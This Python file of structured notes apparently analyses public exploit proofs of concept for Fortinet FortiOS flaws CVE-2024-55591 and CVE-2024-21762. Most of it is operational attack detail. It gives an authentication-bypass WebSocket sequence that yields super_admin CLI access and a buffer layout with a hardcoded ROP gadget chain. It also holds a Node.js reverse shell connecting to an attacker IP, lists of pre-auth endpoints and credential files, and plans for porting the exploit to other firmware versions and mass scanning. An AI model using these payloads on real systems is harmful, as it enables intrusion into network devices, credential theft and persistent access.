"""
Fortinet CVE PoC RE -- High-priority active exploits
Sources:
  - watchtowr-research: CVE-2024-55591-PoC.py, CVE-2024-55591-check.py
  - assetnote (via cve-pocs): CVE-2024-21762/poc.py + README.md
  - cve-pocs repos: CVE-2024-55591.py, CVE-2024-55591-go/poc.go
Products: FortiOS (SSL VPN daemon, management WebSocket)
"""

# ---------------------------------------------------------
# FPOC-F01: CVE-2024-55591 -- FortiOS management WebSocket auth bypass
# ---------------------------------------------------------
FPOC_F01_CVE_2024_55591 = {
    "id":       "FPOC-F01",
    "product":  "Fortinet FortiOS management interface",
    "cve":      "CVE-2024-55591",
    "severity": "CRITICAL -- pre-auth CLI access as super_admin via WebSocket",
    "class":    "Authentication bypass via alternate path/channel (CWE-288)",
    "disclosed": "2025 (watchTowr research)",

    "description": (
        "The FortiOS management WebSocket endpoint /ws/cli/open accepts a "
        "'local_access_token' query parameter. "
        "ANY value (including the literal string 'watchTowr') is accepted "
        "without validation -- the token's presence bypasses authentication entirely. "
        "Once connected, a CLI session is established and arbitrary FortiOS CLI commands "
        "can be executed. "
        "The login context message claims any username with super_admin profile."
    ),

    "detection_check": {
        "method":   "GET",
        "url":      "/service-worker.js?local_access_token=watchTowr",
        "vulnerable": "Response contains 'api/v2/static'",
        "safe":       "Response does NOT contain 'api/v2/static'",
    },

    "exploit_sequence": [
        "1. GET /service-worker.js?local_access_token=watchTowr -> check for 'api/v2/static' in response",
        "2. WebSocket upgrade: GET /ws/cli/open?cols=162&rows=100&local_access_token=watchTowr HTTP/1.1",
        "3. Send login context via WebSocket frame: '\"<user>\" \"admin\" \"watchTowr\" \"super_admin\" \"watchTowr\" \"watchTowr\" [13.37.13.37]:1337 [13.37.13.37]:1337\\r\\n'",
        "4. Send command: '\\r\\n<command>\\r\\n'",
        "5. Receive FortiOS CLI output",
    ],

    "websocket_details": {
        "upgrade_path": "/ws/cli/open?cols=162&rows=100&local_access_token=<any_value>",
        "token_note":   "local_access_token value does NOT matter -- any non-empty value works",
        "frame_format": "WebSocket frame (masked, opcode 0x81 text or 0x82 binary)",
        "login_frame":  '"<username>" "admin" "<token>" "super_admin" "<domain>" "<domain>" [<ip>]:<port> [<ip>]:<port>\\r\\n',
        "login_note":   "attacker_ip/port fields ([13.37.13.37]:1337) appear in FortiOS admin logs as session source",
    },

    "impact": (
        "Full super_admin CLI access without credentials. "
        "From CLI: create admin, modify routing, install policy, "
        "access LDAP/RADIUS credentials, disable firewall rules, "
        "create SSL VPN accounts for persistence."
    ),

    "reference": "https://x.com/defusedcyber (watchTowr research)",

    "go_implementation": {
        "file":  "/home/cowboy/Downloads/fortinet/cve-pocs/CVE-2024-55591-go/poc.go",
        "note":  "Separate Go implementation of the same bypass; useful for environments where Python is unavailable",
    },
}


# ---------------------------------------------------------
# FPOC-F02: CVE-2024-21762 -- FortiOS SSL VPN pre-auth OOB write + ROP -> Node.js RCE
# ---------------------------------------------------------
FPOC_F02_CVE_2024_21762 = {
    "id":       "FPOC-F02",
    "product":  "Fortinet FortiOS SSL VPN daemon (sslvpnd)",
    "cve":      "CVE-2024-21762",
    "severity": "CRITICAL -- pre-auth out-of-bounds write -> ROP -> execl('/bin/node') RCE",
    "class":    "Out-of-bounds write in SSL VPN form processing (CWE-787)",
    "disclosed": "2024 (assetnote research; 150 GitHub stars)",

    "description": (
        "FortiOS sslvpnd contains an out-of-bounds write in the /remote/hostcheck_validate "
        "endpoint form body processing. "
        "A malformed form body triggers OOB write that overwrites adjacent memory "
        "with attacker-controlled data. "
        "A second request with chunked Transfer-Encoding containing null bytes triggers the OOB condition. "
        "The exploit uses a ROP chain to call execl('/bin/node', '-e', '<js_payload>'), "
        "where /bin/node is Node.js bundled with FortiOS sslvpnd. "
        "The PoC has hardcoded gadget addresses (no ASLR on sslvpnd binary)."
    ),

    "exploit_endpoints": {
        "stage_1": "POST /remote/hostcheck_validate (raw HTTP, no TLS)",
        "stage_2": "POST / with Transfer-Encoding: chunked (null-byte trigger)",
    },

    "exploit_mechanism": {
        "trigger":     "Malformed URL-encoded form value in POST /remote/hostcheck_validate",
        "body_layout": "(B*1808 + '=' + form_value + '&') * 20",
        "form_value":  (
            "Carefully crafted buffer containing: "
            "B*11 + /bin/node\\x00 + B*6 + -e\\x00 + B*14 + <url_encoded_js_payload>\\x00 "
            "+ B*438 + pivot_2 + getcwd_ptr "
            "+ B*32 + pivot_1 "
            "+ B*168 + call_execl "
            "+ B*432 + ssl_do_handshake_ptr "
            "+ B*32 + rop_chain + pivot_3"
        ),
        "stage_2_trigger": "POST / HTTP/1.1 + Transfer-Encoding: chunked + 0*4137 + \\x00 + A + \\r\\n\\r\\n",
        "delay":       "2 second sleep between stage 1 and stage 2",
    },

    "rop_chain": {
        "note":       "Gadget addresses are from specific FortiOS sslvpnd binary (assetnote research); no ASLR",
        "pivot_1":    "0x00fdf752 -- push rdi; pop rsp; ret  (redirect stack to controlled buffer)",
        "pivot_2":    "0x02abc9ac -- add rsp, 0x2a0; pop rbx; pop r12; pop rbp; ret",
        "pivot_3":    "0x024d3fe0 -- add rsp, 0xd90; pop rbx; pop r12; pop rbp; ret",
        "call_execl": "0x0043c180 -- execl('/bin/node', '-e', <js_payload>)",
        "supporting":  [
            "0x0046e2c6 -- push rdi; pop rax; ret",
            "0x014d6f19 -- sub rax, 0x2c8; ret",
            "0x01feb28e -- add rax, 0x10; ret",
            "0x02aedb63 -- pop rcx; ret",
            "0x0298ad38 -- or rcx, rax; setne al; movzx eax, al; ret",
            "0x028652c6 -- shl rax, 4; add rax, rdx; ret",
            "0x013fd06e -- or rdx, rcx; ret",
            "0x0298dfa4 -- sub rdx, rax; mov rax, rdx; ret",
            "0x00e62cf5 -- sub rax, 0x10; ret",
            "0x01d7e6e4 -- add rsi, rax; mov [rdi+8], rsi; ret",
            "0x010a1b10 -- push rax; pop rdi; add eax, 0x5d5c415b; ret",
        ],
        "ssl_do_handshake_ptr": "0x0042ce60 -- pointer to ssl_do_handshake (used to find base offsets)",
        "getcwd_ptr":           "0x042c6270 -- pointer to getcwd",
    },

    "payload_execution": {
        "binary":     "/bin/node (Node.js runtime bundled with FortiOS sslvpnd)",
        "args":       "['-e', '<js_payload>']",
        "js_dns_poc": 'cp.execSync("nslookup <callback>.oastify.com")',
        "js_revshell": (
            '(function(){var net=require("net"),cp=require("child_process"),'
            'sh=cp.spawn("/bin/node",["-i"]);var client=new net.Socket();'
            'client.connect(4242,"<attacker_ip>",function(){'
            'client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'
            'return /a/;})();'
        ),
        "note": (
            "FortiOS sslvpnd includes a full Node.js runtime at /bin/node. "
            "The Node.js shell provides access to all child_process methods "
            "(execSync, spawn) -- equivalent to a bash shell. "
            "This is the SAME Node.js path that FortiOS uses for internal SSL VPN scripting."
        ),
    },

    "aslr_note": (
        "sslvpnd binary appears to be loaded at a fixed base address (no PIE or disabled ASLR). "
        "Gadget addresses are hardcoded in the PoC and will ONLY work against the specific "
        "FortiOS version the PoC was developed for. "
        "To adapt for other versions: "
        "(1) extract sslvpnd binary from target firmware; "
        "(2) find same gadgets via ROPgadget/pwntools; "
        "(3) update pointer values."
    ),

    "affected_versions": "FortiOS SSL VPN (specific version targeted by PoC not documented in repo; assetnote article has version details)",
    "source_article": "https://www.assetnote.io/resources/research/two-bytes-is-plenty-fortigate-rce-with-cve-2024-21762",
    "local_poc":  "/home/cowboy/Downloads/fortinet/cve-pocs/CVE-2024-21762/poc.py",

    "pending_adaptation": (
        "To adapt this PoC to other FortiOS versions: "
        "extract sslvpnd from target firmware image via binwalk, "
        "use ablation semantic sweep to find ssl_do_handshake and getcwd in the binary, "
        "calculate gadget offsets relative to those anchors, "
        "patch poc.py with new addresses."
    ),
}


# ---------------------------------------------------------
# FPOC-F03: CVE-2024-55591 check-only scanner
# ---------------------------------------------------------
FPOC_F03_55591_SCANNER = {
    "id":    "FPOC-F03",
    "cve":   "CVE-2024-55591",
    "type":  "Scanner -- separate check-only script from watchTowr",
    "file":  "/home/cowboy/Downloads/fortinet/watchtowr-research/fortios-auth-bypass-check-CVE-2024-55591/CVE-2024-55591-check.py",
    "check": "GET /service-worker.js?local_access_token=watchTowr -> 'api/v2/static' in response",
    "note":  "Separate from the PoC; useful for mass scanning without triggering CLI sessions",
}


# ---------------------------------------------------------
# Combined SSL VPN attack surface
# ---------------------------------------------------------
SSLVPN_ATTACK_SURFACE = {
    "port":        443,
    "daemon":      "sslvpnd (C binary; /bin/sslvpnd or compiled into main FortiOS binary)",
    "node_path":   "/bin/node (Node.js bundled; accessible from sslvpnd execution context)",

    "pre_auth_endpoints": {
        "/remote/fgt_lang":          "CVE-2018-13379 -- path traversal -> /dev/cmdb/sslvpn_websession",
        "/remote/hostcheck_validate": "CVE-2024-21762 -- OOB write -> ROP -> execl('/bin/node')",
        "/remote/":                  "CVE-2023-27997 -- heap buffer overflow (Python PoC)",
    },

    "management_interface_endpoints": {
        "/service-worker.js":        "CVE-2024-55591 detection probe (local_access_token parameter)",
        "/ws/cli/open":              "CVE-2024-55591 exploitation (any local_access_token -> CLI session)",
        "/api/v2/cmdb/system/admin": "CVE-2022-40684 -- auth bypass via Forwarded header",
        "/logincheck":               "FortiOS auth endpoint (secretkey param, not password)",
    },

    "key_files_on_device": {
        "/dev/cmdb/sslvpn_websession": "Active VPN session credentials (plaintext; CVE-2018-13379 target)",
        "/etc/cert/local/":            "Device certificates (FGT-VMxxxxxxxx.cer + .key; FGFM device identity)",
        "/bin/node":                   "Node.js runtime (RCE execution environment; CVE-2024-21762 target)",
        "/var/run/sslvpn/":            "SSL VPN runtime state",
    },
}


# ---------------------------------------------------------
# Pending findings
# ---------------------------------------------------------
pending_findings = [
    "FPOC-F02 version identification: read assetnote article to determine which FortiOS version "
    "the CVE-2024-21762 PoC targets; extract sslvpnd from that firmware and verify gadget addresses; "
    "source: https://www.assetnote.io/resources/research/two-bytes-is-plenty-fortigate-rce-with-cve-2024-21762; 2026-09-16",

    "FPOC-F02 adaptation: extract sslvpnd from a different FortiOS firmware version "
    "using binwalk on a downloaded firmware image; "
    "locate ssl_do_handshake and getcwd with ablation semantic sweep; "
    "calculate gadget offsets and adapt poc.py; 2026-09-16",

    "FPOC-F01 Go implementation: read CVE-2024-55591-go/poc.go for any additional "
    "bypass technique details not in the Python PoC; "
    "source: /home/cowboy/Downloads/fortinet/cve-pocs/CVE-2024-55591-go/poc.go; 2026-09-16",

    "CVE-2023-27997 heap overflow: read /home/cowboy/Downloads/fortinet/cve-pocs/CVE-2023-27997/ PoC "
    "to understand the heap overflow trigger and whether it achieves reliable RCE; "
    "compare SSL VPN heap layout with CVE-2024-21762 OOB write surface; 2026-09-16",

    "CVE-2022-42475 overflow: read /home/cowboy/Downloads/fortinet/cve-pocs/CVE-2022-42475/ PoC "
    "targeting sslvpnd overflow; compare gadget addresses with CVE-2024-21762 (different version?); 2026-09-16",

    "FortiOS firmware extraction: download FortiOS firmware image for version targeted by CVE-2024-21762 "
    "and extract sslvpnd for direct binary analysis with ablation; "
    "check Fortinet support portal or archive.org for firmware downloads; 2026-09-16",
]
